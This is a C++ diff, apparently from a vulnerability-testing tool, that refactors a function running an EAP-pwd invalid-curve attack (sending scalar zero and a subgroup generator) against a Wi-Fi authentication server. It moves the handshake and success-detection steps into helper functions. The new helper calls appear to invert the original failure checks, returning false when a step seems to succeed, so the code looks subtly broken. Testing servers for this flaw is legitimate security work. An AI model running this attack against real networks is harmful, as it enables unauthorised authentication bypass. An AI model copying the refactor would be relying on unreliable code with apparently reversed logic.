@@ -163,25 +163,8 @@ bool run_invalid_curve_exchange(EAP_Att eap_att){
 	if (!do_auth(eap_att)) return false;
     if (!do_assoc(eap_att)) return false;
 
-	// EAP-Identity
-	{
-		uint8_t eap_id = 0;
-		const auto eapol = wait_eapol(eap_att, [&](const vector<uint8_t>& e){ return is_identity_request(e, eap_id); });
-        if (!eapol || eapol->empty()) { log(LogLevel::WARNING, "No EAP-Identity request"); return false; }
-        send_eapol(eap_att, build_identity_response(eap_id, eap_att.identity));
-    }
-
-    // EAP-PWD-ID
-    {
-        optional<EapPwdFrame> frame;
-        const auto e = wait_eapol(eap_att, [&](const vector<uint8_t>& v){
-            const auto f = parse_eap_pwd(v);
-            if (f && f->opcode == PWD_OPCODE_ID) { frame = f; return true; }
-            return false;
-        });
-        if (!e || e->empty()) { log(LogLevel::WARNING, "No EAP-PWD-ID request"); return false; }
-        send_eapol(eap_att, build_pwd_id_response(*frame, eap_att.identity));
-    }
+	if(send_eap_normal_EAP(eap_att)) return false;
+	if(send_eap_normal_EAP_pwd_ID(eap_att)) return false;
 
     // EAP-PWD-Commit: capture server commit, send scalar=0 + subgroup_gen as element
     array<uint8_t, 64> server_elem{};
@@ -244,14 +227,7 @@ bool run_invalid_curve_exchange(EAP_Att eap_att){
         send_eapol(eap_att, make_pwd_eapol(frame->eap_id, PWD_OPCODE_CONFIRM, our_confirm.data(), 32));
     }
 
-    // Wait for EAP-Success
-    const auto e = wait_eapol(eap_att, [](const vector<uint8_t>&){ return false; });
-    if (e && e->empty()) {
-        log(LogLevel::INFO, "[!] EAP-Success – server is vulnerable to invalid curve attack!");
-        return true;
-    }
-    log(LogLevel::WARNING, "Invalid curve exchange ended without EAP-Success");
-    return false;
+	return eap_pwd_wait_for_success(eap_att);
 }
 
 void setup_attack(RunStatus& rs) {
